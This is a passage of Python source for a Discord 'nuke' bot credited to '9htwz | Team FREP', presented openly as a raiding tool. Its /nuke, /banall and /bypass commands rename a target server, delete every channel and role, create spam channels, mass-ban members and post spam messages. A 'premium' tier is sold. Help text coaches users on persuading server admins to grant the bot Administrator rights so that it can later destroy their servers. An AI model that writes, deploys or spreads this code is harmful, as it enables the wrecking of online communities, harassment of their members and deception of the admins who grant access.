            print(f"\x1b[38;5;34m{channel.name} Has Been Successfully Deleted!")
        except:
            print("\x1b[38;5;196mUnable To Delete Channel!")

    for i in range(amount):
        try:  
            await ctx.guild.create_text_channel(random.choice(channel_names))
            print(f"\x1b[38;5;34mSuccessfully Made Channel [{i}]!")
            await asyncio.sleep(0.2)  # Optimized delay
        except:
            print("\x1b[38;5;196mUnable To Create Channel!")

# Slash command versions for app installations
@client.tree.command(name="help", description="Show all available commands")
async def slash_help(interaction: discord.Interaction):
    embed = discord.Embed(title="🔥 YANDOR NUKE BOT", description="Select a category below:", color=0xff0000)
    embed.set_footer(text="Made by 9htwz")
    view = HelpView()
    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)

@client.tree.command(name="nuke", description="Nuke the server")
async def slash_nuke(interaction: discord.Interaction, amount: int = 50):
    await interaction.response.defer()
    
    print(f"\x1b[38;5;172mStarting slash nuke on {interaction.guild.name}...")

    # Track success/failure counts
    channels_deleted = 0
    roles_deleted = 0
    channels_created = 0
    members_banned = 0
    channels_spammed = 0
    name_changed = False
    
    # Send raid notification
    await send_raid_notification(interaction.guild, interaction.user, "/nuke")

    # Change server name first
    try:
        await interaction.guild.edit(name="TRASHED BY 9htwz | 𝐓𝐞𝐚𝐦 𝐅𝐑𝐄𝐏")
        print(f"\x1b[38;5;34mServer name changed!")
        name_changed = True
        await asyncio.sleep(1)
    except Exception as e:
        print(f"\x1b[38;5;196mUnable to change server name: {e}")

    # Delete all channels
    channels = list(interaction.guild.channels)
    for channel in channels:
        try:
            await channel.delete()
            print(f"\x1b[38;5;34m{channel.name} Has Been Successfully Deleted!")
            channels_deleted += 1
            await asyncio.sleep(0.3)
        except Exception as e:
            print(f"\x1b[38;5;196mUnable To Delete {channel.name}: {e}")

    # Delete all roles except @everyone
    roles = [role for role in interaction.guild.roles if role.name != "@everyone"]
    for role in roles:
        try:
            await role.delete()
            print(f"\x1b[38;5;34m{role.name} Has Been Successfully Deleted!")
            roles_deleted += 1
            await asyncio.sleep(0.3)
        except Exception as e:
            print(f"\x1b[38;5;196m{role.name} Is Unable To Be Deleted: {e}")

    # Create new channels
    for i in range(min(amount, 50)):
        try:  
            new_channel = await interaction.guild.create_text_channel(random.choice(channel_names))
            print(f"\x1b[38;5;34mSuccessfully Made Channel [{i+1}]: {new_channel.name}!")
            channels_created += 1
            await asyncio.sleep(0.8)
        except Exception as e:
            print(f"\x1b[38;5;196mUnable To Create Channel [{i+1}]: {e}")

    # Ban members
    members = [member for member in interaction.guild.members if not member.bot and member.id != interaction.user.id]
    for member in members:
        try:
            await member.ban(reason="Nuked by 9htwz")
            print(f"\x1b[38;5;34m{member.name} Has Been Successfully Banned!")
            members_banned += 1
            await asyncio.sleep(0.3)
        except Exception as e:
            print(f"\x1b[38;5;196mUnable To Ban {member.name}: {e}")

    # Spam new channels
    await asyncio.sleep(2)
    new_channels = [ch for ch in interaction.guild.channels if isinstance(ch, discord.TextChannel)]
    for channel in new_channels:
        try:
            await channel.send(random.choice(message_spam))
            print(f"\x1b[38;5;34m{channel.name} Has Been Spammed!")
            channels_spammed += 1
            await asyncio.sleep(1)
        except Exception as e:
            print(f"\x1b[38;5;196mUnable To Spam {channel.name}: {e}")

    print(f"\x1b[38;5;172mSlash nuke completed on {interaction.guild.name}!")
    
    # Calculate total successful operations
    total_successful = channels_deleted + roles_deleted + channels_created + members_banned + channels_spammed
    if name_changed:
        total_successful += 1
    
    # Create status report based on actual results
    try:
        if total_successful > 0:
            if channels_deleted > 0 or channels_created > 0 or members_banned > 0:
                # Success - at least some major operations worked
                status_embed = discord.Embed(
                    title="🔥 Nuke completed successfully!", 
                    description=f"**{interaction.guild.name}** has been nuked!",
                    color=0x00ff00
                )
                
                results_text = ""
                if name_changed:
                    results_text += "✅ Server name changed\n"
                if channels_deleted > 0:
                    results_text += f"✅ Deleted {channels_deleted} channels\n"
                if roles_deleted > 0:
                    results_text += f"✅ Deleted {roles_deleted} roles\n"
                if channels_created > 0:
                    results_text += f"✅ Created {channels_created} new channels\n"
                if members_banned > 0:
                    results_text += f"✅ Banned {members_banned} members\n"
                if channels_spammed > 0:
                    results_text += f"✅ Spammed {channels_spammed} channels\n"
                
                status_embed.add_field(name="📊 Nuke Results", value=f"```diff\n{results_text}```", inline=False)
            else:
                # Partial success
                status_embed = discord.Embed(
                    title="⚠️ Nuke partially completed", 
                    description=f"Some operations completed on **{interaction.guild.name}**",
                    color=0xffaa00
                )
                status_embed.add_field(name="📊 Results", value=f"```yaml\nPartial Success: {total_successful} operations completed```", inline=False)
        else:
            # Complete failure
            status_embed = discord.Embed(
                title="❌ Nuke failed!", 
                description=f"Unable to nuke **{interaction.guild.name}** - check bot permissions",
                color=0xff0000
            )
            status_embed.add_field(name="💡 Solutions", value="```yaml\n• Ensure bot has Administrator permission\n• Check if bot role is highest in hierarchy\n• Try inviting bot with proper permissions```", inline=False)
        
        status_embed.set_footer(text="Made by 9htwz | Team FREP")
        await interaction.followup.send(embed=status_embed)
        
    except Exception as e:
        print(f"\x1b[38;5;196mError sending status embed: {e}")
        try:
            await interaction.followup.send("🔥 Nuke operation completed! Check console for details.")
        except:
            pass

@client.tree.command(name="banall", description="Ban all members in the server")
async def slash_banall(interaction: discord.Interaction):
    await interaction.response.defer()
    
    banned_count = 0
    members = [member for member in interaction.guild.members if not member.bot and member.id != interaction.user.id]

    for member in members:
        try:
            await member.ban(reason="Mass ban by 9htwz")
            banned_count += 1
            print(f"\x1b[38;5;34m{member.name} Has Been Successfully Banned!")
            await asyncio.sleep(0.3)
        except:
            print(f"\x1b[38;5;196mUnable To Ban {member.name}!")

    print(f"\x1b[38;5;172mBanned {banned_count} members total!")
    
    try:
        await interaction.followup.send(f"🔨 Banned {banned_count} members successfully!", ephemeral=True)
    except:
        pass

@client.tree.command(name="bypass", description="Bypass and nuke a server using invite link or server ID (Premium)")
async def slash_bypass(interaction: discord.Interaction, target: str = None):
    if not is_premium(interaction.user.id):
        embed = discord.Embed(title="💎 Premium Required", description="This command requires premium access. Contact 9htwz to upgrade.", color=0xff0000)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return

    if target is None:
        # Show available servers the bot is in
        bot_guilds = client.guilds
        
        embed = discord.Embed(title="🚀 INSTANT NUKE MODE", description="**DIRECT SERVER ACCESS:** Nuke any server the bot is currently in!\n\n**How it works:**\n• Bot uses existing server access\n• Instant server destruction\n• No invite needed\n• Complete annihilation", color=0xff0000)

        if bot_guilds:
            # Show available servers to nuke
            available_servers = ""
            for i, guild in enumerate(bot_guilds[:5]):
                server_info = f"```yaml\n🎯 {guild.name[:25]}...\n   Server ID: {guild.id}\n   Members: {guild.member_count}\n   Channels: {len(guild.channels)}\n   Status: READY TO NUKE```\n"
                if len(available_servers + server_info) > 900:
                    break
                available_servers += server_info

            embed.add_field(name="🎯 Servers Ready for Destruction", value=available_servers[:1024], inline=False)
            
            how_to_use = "```yaml\n1. Get invite OR server ID from target\n2. Use: /bypass [invite_link or server_id]\n3. Instant nuclear destruction\n4. OR use /nuke on current server```"
            embed.add_field(name="📋 How to Use", value=how_to_use[:1024], inline=False)
        else:
            embed.add_field(name="❌ No Target Servers", value="```yaml\nNo servers currently accessible\nNeed bot to be added to target servers first```", inline=False)
            
            how_to_get_access = f"```yaml\n1. Share bot invite: \n   /invite command\n2. Get admin to add bot to target\n3. Use /bypass or /nuke\n4. Complete server destruction```"
            embed.add_field(name="🔗 Get Access to Servers", value=how_to_get_access[:1024], inline=False)

        example_text = f"```yaml\n/bypass https://discord.gg/abc123\n/bypass 1234567890123456789\n\n• Use invite link OR server ID\n• Direct server access method\n• Instant destruction capability```"
        embed.add_field(name="⚡ Example", value=example_text[:1024], inline=False)

        warning_text = "```diff\n- INSTANT SERVER DESTRUCTION\n- PERMANENT DAMAGE\n- CANNOT BE UNDONE\n- USE WITH EXTREME CAUTION```"
        embed.add_field(name="⚠️ Warning", value=warning_text[:1024], inline=False)
        embed.set_footer(text="Made by 9htwz | Instant Access Nuke")
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return

    # Execute bypass nuke with invite link
    await interaction.response.defer()
    
    try:
        target_guild = None
        
        # Check if input is a server ID (numeric) or invite link
        if target.isdigit():
            # Server ID method
            server_id = int(target)
            
            # Check if bot is in the server
            for guild in client.guilds:
                if guild.id == server_id:
                    target_guild = guild
                    break
            
            if not target_guild:
                embed = discord.Embed(title="❌ Server Not Found", description=f"Bot is not in server with ID: `{server_id}`\n\n**To access this server:**\n1. Bot needs to be added to the target server\n2. Use bot invite or 'Add to Apps'\n3. Once added, try `/bypass {server_id}` again", color=0xff0000)
                await interaction.followup.send(embed=embed, ephemeral=True)
                return
        
        else:
            # Invite link method
            if not (target.startswith("https://discord.gg/") or target.startswith("https://discord.com/invite/")):
                embed = discord.Embed(title="❌ Invalid Input", description=f"Invalid format!\n\n**Valid formats:**\n• `https://discord.gg/CODE` (invite link)\n• `https://discord.com/invite/CODE` (invite link)\n• `1234567890123456789` (server ID)", color=0xff0000)
                await interaction.followup.send(embed=embed, ephemeral=True)
                return

            # Extract invite code and check if bot is already in server
            invite_code = target.split("/")[-1]
            invite = await client.fetch_invite(invite_code)
            
            for guild in client.guilds:
                if guild.id == invite.guild.id:
                    target_guild = guild
                    break
        
        if not target_guild:
            # Handle partial guild object safely
            member_count = getattr(invite.guild, 'member_count', 'Unknown')
            embed = discord.Embed(
                title="🎯 Target Server Located", 
                description=f"**Server Found:** {invite.guild.name}\n**Members:** {member_count}\n\n**Status:** Bot not currently in this server",
                color=0xffaa00
            )
            embed.add_field(
                name="🚀 How to Access This Server", 
                value=f"```yaml\n1. Share this bot invite with server admin:\n   https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=bot%20applications.commands\n\n2. Once bot is added, use:\n   /bypass {target}\n\n3. OR simply use /nuke in that server```", 
                inline=False
            )
            embed.add_field(
                name="⚡ Alternative Method", 
                value="```yaml\n• Get admin to add bot to server\n• Use /nuke command directly\n• Instant server destruction\n• No bypass needed```", 
                inline=False
            )
            embed.set_footer(text="Made by 9htwz | Direct Access Method")
            await interaction.followup.send(embed=embed, ephemeral=True)
            return

        # Bot is already in the server - proceed with nuke
        embed = discord.Embed(title="🚀 DIRECT ACCESS CONFIRMED", description=f"**Bot already in {target_guild.name}!** Ready for instant nuke!", color=0xff0000)
        embed.add_field(name="🎯 Target Server Info", value=f"```yaml\nServer: {target_guild.name}\nMembers: {target_guild.member_count}\nChannels: {len(target_guild.channels)}\nRoles: {len(target_guild.roles)}\nStatus: READY FOR DESTRUCTION```", inline=False)
        embed.add_field(name="💀 DESTRUCTION MODE", value="```diff\n+ Bot has direct access\n+ No bypass needed\n+ Instant nuclear capability\n+ Complete server annihilation```", inline=False)
        embed.set_footer(text="Made by 9htwz | Direct Access Nuke")

        view = SlashInviteBypassView(interaction, target_guild)
        await interaction.followup.send(embed=embed, view=view, ephemeral=True)

    except Exception as e:
        embed = discord.Embed(title="❌ Access Failed", description=f"Unable to access target server: {str(e)}", color=0xff0000)
        await interaction.followup.send(embed=embed, ephemeral=True)

@client.tree.command(name="premium", description="Check your premium status")
async def slash_premium(interaction: discord.Interaction):
    if is_premium(interaction.user.id):
        embed = discord.Embed(title="💎 Premium Status", description="✅ You have premium access!", color=0x00ff00)
    else:
        embed = discord.Embed(title="💎 Premium Status", description="❌ You don't have premium access. Contact 9htwz for upgrade.", color=0xff0000)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@client.tree.command(name="invite", description="Get the bot invite link")
async def slash_invite(interaction: discord.Interaction):
    invite_link = f"https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=bot%20applications.commands"
    embed = discord.Embed(title="🔗 Bot Invite Link", description=f"[Click here to invite the bot]({invite_link})", color=0x0099ff)
    
    embed.add_field(
        name="🎯 Add to Server (Traditional)", 
        value="```yaml\n• Prefix commands: .nuke, .banall, etc.\n• Full bot functionality\n• Administrator permissions\n• Works in any server```", 
        inline=False
    )
    
    embed.add_field(
        name="⚡ Add to Apps (Modern)", 
        value="```yaml\n• Slash commands: /nuke, /bypass, etc.\n• Enhanced Discord integration\n• Administrator permissions\n• Works across all servers bot is in```", 
        inline=False
    )
    
    embed.add_field(
        name="🚀 How Add to Apps Works", 
        value="```yaml\n1. Click 'Add to Apps' when inviting\n2. Bot gets slash command access\n3. Use /nuke in ANY server bot is in\n4. Use /bypass to target specific servers\n5. No need to invite to each server```", 
        inline=False
    )
    
    embed.add_field(
        name="💡 Pro Tip", 
        value="```diff\n+ Add to Apps = Global access\n+ Use /nuke directly in target servers\n+ Use /bypass for advanced targeting\n+ Both methods need Administrator perms```", 
        inline=False
    )
    
    embed.set_footer(text="Made by 9htwz | Both methods grant full Administrator permissions!")
    await interaction.response.send_message(embed=embed, ephemeral=True)

class SlashInviteBypassView(discord.ui.View):
    def __init__(self, interaction, target_guild):
        super().__init__(timeout=60)
        self.interaction = interaction
        self.target_guild = target_guild

    @discord.ui.button(label="🔥 EXECUTE FULL NUKE", style=discord.ButtonStyle.danger, emoji="💥")
    async def execute_slash_bypass(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.interaction.user.id:
            await interaction.response.send_message("❌ Only the command executor can use this!", ephemeral=True)
            return

        await interaction.response.send_message(f"🚀 **INVITE BYPASS INITIATED!**\n```diff\n- NUKING {self.target_guild.name}...\n- COMPLETE DESTRUCTION STARTING\n- THIS CANNOT BE STOPPED!```", ephemeral=True)

        print(f"\x1b[38;5;172m🚀 STARTING SLASH BYPASS NUKE ON {self.target_guild.name}")

        # Send raid notification
        await send_raid_notification(self.target_guild, self.interaction.user, "/bypass")

        # Execute full nuke (same logic as regular bypass)
        try:
            await self.target_guild.edit(name="BYPASSED BY 9htwz | 𝐓𝐞𝐚𝐦 𝐅𝐑𝐄𝐏")
            print(f"\x1b[38;5;34mServer name changed!")
            await asyncio.sleep(1)

            channels = list(self.target_guild.channels)
            for channel in channels:
                try:
                    await channel.delete()
                    print(f"\x1b[38;5;34m{channel.name} Has Been Successfully Deleted!")
                    await asyncio.sleep(0.3)
                except:
                    print(f"\x1b[38;5;196mUnable To Delete {channel.name}!")

            roles = [role for role in self.target_guild.roles if role.name != "@everyone"]
            for role in roles:
                try:
                    await role.delete()
                    print(f"\x1b[38;5;34m{role.name} Has Been Successfully Deleted!")
                    await asyncio.sleep(0.3)
                except:
                    print(f"\x1b[38;5;196m{role.name} Is Unable To Be Deleted")

            for i in range(50):
                try:  
                    await self.target_guild.create_text_channel(random.choice(channel_names))
                    print(f"\x1b[38;5;34mSuccessfully Made Channel [{i+1}]!")
                    await asyncio.sleep(0.8)
                except:
                    print("\x1b[38;5;196mUnable To Create Channel!")

            members = [member for member in self.target_guild.members if not member.bot and member.id != self.interaction.user.id]
            for member in members:
                try:
                    await member.ban(reason="Bypassed and nuked by 9htwz")
                    print(f"\x1b[38;5;34m{member.name} Has Been Successfully Banned!")
                    await asyncio.sleep(0.3)
                except:
                    print(f"\x1b[38;5;196mUnable To Ban {member.name}!")

            await asyncio.sleep(2)
            new_channels = self.target_guild.channels
            for channel in new_channels:
                try:
                    await channel.send(random.choice(message_spam))
                    print(f"\x1b[38;5;34m{channel.name} Has Been Spammed!")
                    await asyncio.sleep(1)
                except:
                    print(f"\x1b[38;5;196mUnable To Spam {channel.name}!")

        except Exception as e:
            print(f"\x1b[38;5;196mError during slash bypass nuke: {e}")

        print(f"\x1b[38;5;172m🚀 SLASH BYPASS NUKE COMPLETED ON {self.target_guild.name}!")

    @discord.ui.button(label="❌ Cancel", style=discord.ButtonStyle.secondary)
    async def cancel_slash_bypass(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.interaction.user.id:
            await interaction.response.send_message("❌ Only the command executor can use this!", ephemeral=True)
            return

        embed = discord.Embed(title="✅ Invite Bypass Cancelled", description="Bypass operation has been cancelled safely.", color=0x00ff00)
        await interaction.response.edit_message(embed=embed, view=None)

# Run the bot
client.run(token)